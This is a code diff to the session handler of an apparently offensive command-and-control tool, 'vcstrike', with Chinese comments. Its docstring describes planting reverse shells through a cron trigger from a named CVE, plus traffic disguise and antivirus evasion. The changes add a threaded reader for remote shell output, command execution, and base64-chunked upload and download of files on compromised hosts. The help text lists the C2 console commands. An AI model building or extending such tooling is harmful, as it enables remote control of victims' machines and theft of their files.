@@ -5,6 +5,11 @@
 流量伪装与免杀。植入端即标准 bash/python 反弹 shell（由 CVE-2026-59310
 的 cron 触发），断线不自动重连；重连 = 重新植入（见 plant_revshell）。
 
+IO 模型（与原始 POC 的裸 shell 循环行为一致）：
+    每个会话一个持续读取线程，输出以原始流方式实时进入 Session.buffer
+    （仅剥离 ANSI 转义序列、归一化换行），交互端随时取用 —— 不做
+    "切块等待"。命令发送后不做本地回显（远端 PTY 会回显）。
+
 用法（CLI）：
     python -m vcstrike listen --ports 4444,8443
     python -m vcstrike revshell <host> --lhost <ip> --lport 4444
@@ -24,6 +29,18 @@ import socket
 import threading
 import time
 
+# ANSI 转义序列：CSI（颜色/光标）、OSC（窗口标题等）、键盘模式/复位
+ANSI_RE = re.compile(
+    r"\x1b\[[0-9;?]*[A-Za-z]"
+    r"|\x1b\][^\x07\x1b]*(?:\x07|\x1b\\)?"
+    r"|\x1b[=>#c]")
+
+
+def strip_ansi(text):
+    """剥离 ANSI 转义并归一化换行（\r\n / \r → \n）。"""
+    text = ANSI_RE.sub("", text)
+    return text.replace("\r\n", "\n").replace("\r", "\n")
+
 
 class Session:
     _next_id = 1
@@ -39,46 +56,82 @@ class Session:
         self.last_seen = time.time()
         self.alive = True
         self._log = on_log
-        self._lock = threading.Lock()
-        self._recv_lock = threading.Lock()   # 串行化读取（防 exec/probe/传输并发混流）
+        self._send_lock = threading.Lock()
+        self._buf_lock = threading.Lock()
+        self._consume_lock = threading.Lock()   # 串行化"等待+消费"型操作
+        self.feed_paused = False                # GUI 实时流暂停（传输/收集期间）
+        self.buffer = ""                        # 累积输出（已剥离 ANSI）
+        self._pos = 0                           # 消费游标
         self.name = ""
+        self.conn.settimeout(0.3)
+        threading.Thread(target=self._reader, daemon=True).start()
+
+    def _reader(self):
+        """持续读取线程：输出以原始流实时进入 buffer（等价 nc 行为）。"""
+        while self.alive:
+            try:
+                d = self.conn.recv(65536)
+            except socket.timeout:
+                continue
+            except OSError:
+                break
+            if not d:
+                break
+            text = strip_ansi(d.decode("utf-8", "replace"))
+            with self._buf_lock:
+                self.buffer += text
+                self.last_seen = time.time()
+        self.alive = False
+        self._log("[i] 会话 #%d 连接关闭" % self.id)
 
     def send_line(self, cmd):
-        with self._lock:
+        with self._send_lock:
             self.conn.sendall(cmd.encode() + b"\n")
             self.last_seen = time.time()
 
-    def read_until_quiet(self, quiet=1.2, maxwait=12):
-        """读取输出直到静默 quiet 秒或超过 maxwait（持读锁，防并发混流）。"""
-        with self._recv_lock:
-            return self._read_until_quiet_locked(quiet, maxwait)
+    # ---- 输出消费 ----
+    def output_len(self):
+        with self._buf_lock:
+            return len(self.buffer)
 
-    def _read_until_quiet_locked(self, quiet, maxwait):
-        buf = b""
-        self.conn.settimeout(quiet)
+    def pending_output(self):
+        with self._buf_lock:
+            return self.buffer[self._pos:]
+
+    def take_output(self):
+        """取走自上次消费以来的全部输出（实时流消费口）。"""
+        with self._buf_lock:
+            out = self.buffer[self._pos:]
+            self._pos = len(self.buffer)
+            return out
+
+    def wait_new_output(self, baseline, quiet=0.8, maxwait=10):
+        """阻塞等待 buffer 相对 baseline 出现新内容并静默 quiet 秒。
+
+        无输出的命令（cd 等）会在 quiet 秒后快速返回 False，不会等满 maxwait。
+        """
         deadline = time.time() + maxwait
+        last_size = self.output_len()
+        last_change = time.time()
         while time.time() < deadline:
-            try:
-                d = self.conn.recv(65536)
-                if not d:
-                    self.alive = False
-                    break
-                buf += d
-                self.last_seen = time.time()
-                if not d.strip():   # 纯空白（提示符回显）也继续等一小会
-                    continue
-            except socket.timeout:
-                break
-            except OSError:
-                self.alive = False
-                break
-        return buf.decode("utf-8", "replace")
+            size = self.output_len()
+            if size != last_size:
+                last_size = size
+                last_change = time.time()
+            elif time.time() - last_change >= quiet:
+                return size > baseline
+            if not self.alive and self.output_len() <= baseline:
+                return False
+            time.sleep(0.05)
+        return self.output_len() > baseline
 
     def probe(self):
         """存活探测。"""
         try:
-            self.send_line("")
-            self.read_until_quiet(0.6, 2)
+            with self._consume_lock:
+                base = self.output_len()
+                self.send_line("")
+                self.wait_new_output(base, quiet=0.5, maxwait=3)
             return self.alive
         except OSError:
             self.alive = False
@@ -121,7 +174,6 @@ class SessionManager:
                 conn, addr = srv.accept()
             except OSError:
                 return
-            conn.settimeout(2)
             sess = Session(conn, addr, on_log=self._log)
             with self._lock:
                 self.sessions[sess.id] = sess
@@ -141,12 +193,16 @@ class SessionManager:
         with self._lock:
             return list(self.sessions.values())
 
-    def exec(self, sid, cmd, timeout=12, quiet=1.2):
+    def exec(self, sid, cmd, timeout=10, quiet=0.8):
+        """执行命令并收集输出（消费式；GUI 实时流在传输类操作中自动暂停）。"""
         s = self.get(sid)
         if not s or not s.alive:
             raise RuntimeError("会话 #%s 不存在或已断开" % sid)
-        s.send_line(cmd)
-        return s.read_until_quiet(quiet=quiet, maxwait=timeout)
+        with s._consume_lock:
+            base = s.output_len()
+            s.send_line(cmd)
+            s.wait_new_output(base, quiet=quiet, maxwait=timeout)
+            return s.take_output()
 
     def close(self, sid):
         s = self.get(sid)
@@ -156,46 +212,73 @@ class SessionManager:
                 self.sessions.pop(sid, None)
             self._log("[i] 会话 #%d 已关闭" % sid)
 
-    # ---- 文件传输（经 shell 通道，base64 分块） ----
+    # ---- 文件传输（经 shell 通道，base64 分块；期间暂停实时流防抢读） ----
     def upload(self, sid, local, remote, chunk=8192, progress=None):
-        with open(local, "rb") as f:
-            data = f.read()
-        total = max(1, (len(data) + chunk - 1) // chunk)
-        rq = "'%s'" % remote.replace("'", "'\\''")   # 远端路径引号安全
-        self.exec(sid, "rm -f -- %s" % rq, timeout=4, quiet=0.4)
-        for i in range(0, len(data), chunk):
-            b64 = base64.b64encode(data[i:i + chunk]).decode()
-            self.exec(sid, "printf %%s %s | base64 -d >> %s" % (b64, rq),
-                      timeout=20, quiet=0.4)
-            if progress:
-                progress(i // chunk + 1, total)
-        out = self.exec(sid, "md5sum %s" % rq, timeout=15)
-        local_md5 = hashlib.md5(data).hexdigest()
-        m = re.search(r"([0-9a-f]{32})", out)
-        if not m or m.group(1) != local_md5:
-            raise RuntimeError("上传校验失败（远端 md5 不匹配）：%s" % out.strip()[:120])
-        return "上传完成，md5 校验一致（%s）" % local_md5
+        s = self.get(sid)
+        if not s or not s.alive:
+            raise RuntimeError("会话 #%s 不存在或已断开" % sid)
+        with s._consume_lock:
+            s.feed_paused = True
+            try:
+                with open(local, "rb") as f:
+                    data = f.read()
+                total = max(1, (len(data) + chunk - 1) // chunk)
+                rq = "'%s'" % remote.replace("'", "'\\''")   # 远端路径引号安全
+                self._raw(s, "rm -f -- %s" % rq, quiet=0.4)
+                for i in range(0, len(data), chunk):
+                    b64 = base64.b64encode(data[i:i + chunk]).decode()
+                    self._raw(s, "printf %%s %s | base64 -d >> %s" % (b64, rq),
+                              quiet=0.4)
+                    if progress:
+                        progress(i // chunk + 1, total)
+                out = self._raw(s, "md5sum %s" % rq, quiet=1.0, maxwait=15)
+                local_md5 = hashlib.md5(data).hexdigest()
+                m = re.search(r"([0-9a-f]{32})", out)
+                if not m or m.group(1) != local_md5:
+                    raise RuntimeError(
+                        "上传校验失败（远端 md5 不匹配）：%s" % out.strip()[:120])
+                return "上传完成，md5 校验一致（%s）" % local_md5
+            finally:
+                s.feed_paused = False
 
     def download(self, sid, remote, local, timeout=60):
-        rq = "'%s'" % remote.replace("'", "'\\''")
-        out = self.exec(sid, "base64 -w0 %s 2>&1" % rq, timeout=timeout, quiet=2.0)
-        lines = [ln.strip() for ln in out.splitlines() if ln.strip()]
-        cand = ""
-        for ln in reversed(lines):
-            if all(c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=" for c in ln):
-                cand = ln
-                break
-        if not cand:
-            raise RuntimeError("未取到有效 base64 输出：%s" % out[:200])
-        try:
-            data = base64.b64decode(cand, validate=True)
-        except Exception as e:
-            raise RuntimeError(
-                "base64 解码失败（输出可能被截断；大文件请先 gzip 或增大超时）：%s" % e)
-        os.makedirs(os.path.dirname(os.path.abspath(local)), exist_ok=True)
-        with open(local, "wb") as f:
-            f.write(data)
-        return "已保存 %s（%d 字节）" % (local, len(data))
+        s = self.get(sid)
+        if not s or not s.alive:
+            raise RuntimeError("会话 #%s 不存在或已断开" % sid)
+        with s._consume_lock:
+            s.feed_paused = True
+            try:
+                rq = "'%s'" % remote.replace("'", "'\\''")
+                out = self._raw(s, "base64 -w0 %s 2>&1" % rq, quiet=2.0,
+                                maxwait=timeout)
+                lines = [ln.strip() for ln in out.splitlines() if ln.strip()]
+                cand = ""
+                for ln in reversed(lines):
+                    if all(c in "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+                           "abcdefghijklmnopqrstuvwxyz0123456789+/=" for c in ln):
+                        cand = ln
+                        break
+                if not cand:
+                    raise RuntimeError("未取到有效 base64 输出：%s" % out[:200])
+                try:
+                    data = base64.b64decode(cand, validate=True)
+                except Exception as e:
+                    raise RuntimeError(
+                        "base64 解码失败（输出可能被截断；大文件请先 gzip 或增大超时）:%s"
+                        % e)
+                os.makedirs(os.path.dirname(os.path.abspath(local)), exist_ok=True)
+                with open(local, "wb") as f:
+                    f.write(data)
+                return "已保存 %s（%d 字节）" % (local, len(data))
+            finally:
+                s.feed_paused = False
+
+    def _raw(self, s, cmd, quiet=0.8, maxwait=10):
+        """exec 的内部形态：不加锁（调用方已持 consume_lock）。"""
+        base = s.output_len()
+        s.send_line(cmd)
+        s.wait_new_output(base, quiet=quiet, maxwait=maxwait)
+        return s.take_output()
 
     def shutdown(self):
         for _p, srv in self.listeners:
@@ -213,13 +296,13 @@ HELP_TEXT = """\
   sessions                        列出会话
   listeners                       查看监听端口
   use <id> / back                 进入/退出会话直通（原始 shell）
-  exec <id> <cmd...>              在会话执行命令并回显
+  exec <id> <cmd...>              在会话执行命令并收集输出
   upload <id> <local> <remote>    上传（md5 自动校验；路径含空格请加引号）
   download <id> <remote> <local>  下载（base64 校验；大文件建议先 gzip）
   close <id>                      关闭会话
   exit                            会话直通中返回 c2>；顶层退出控制台
-提示：长时间无输出的命令（sleep/dd 等）会被静默判定提前返回；
-      download 单次读回受超时限制，超大文件先压缩。
+说明：会话输出为原始流（ANSI 颜色码已剥离）；长时间无输出的命令会被
+      静默判定提前返回；download 单次读回受超时限制，超大文件先压缩。
 """
 
 
